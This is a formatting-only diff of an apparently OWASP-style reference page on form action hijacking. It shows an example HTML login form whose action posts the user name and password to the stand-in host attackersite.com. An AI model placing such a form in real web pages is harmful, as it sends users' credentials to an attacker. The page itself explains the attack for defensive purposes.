@@ -1,13 +1,11 @@
 ---
-
 layout: col-sidebar
 title: Form action hijacking
 author: Robert Gilbert (amroot)
-contributors: 
+contributors:
 permalink: /attacks/Form_action_hijacking
 tags: attack, Form action hijacking
 auto-migrated: 1
-
 ---
 
 {% include writers.html %}
@@ -43,9 +41,9 @@ Source:
 
 ```html
 <form name="form1" id="form1" method="post" action="https://attackersite.com">
-    <input type="text" name="id" value="user name">
-    <input type="password" name="pass" value="password">
-    <input type="submit" name="submit" value="Submit">
+  <input type="text" name="id" value="user name" />
+  <input type="password" name="pass" value="password" />
+  <input type="submit" name="submit" value="Submit" />
 </form>
 ```
 
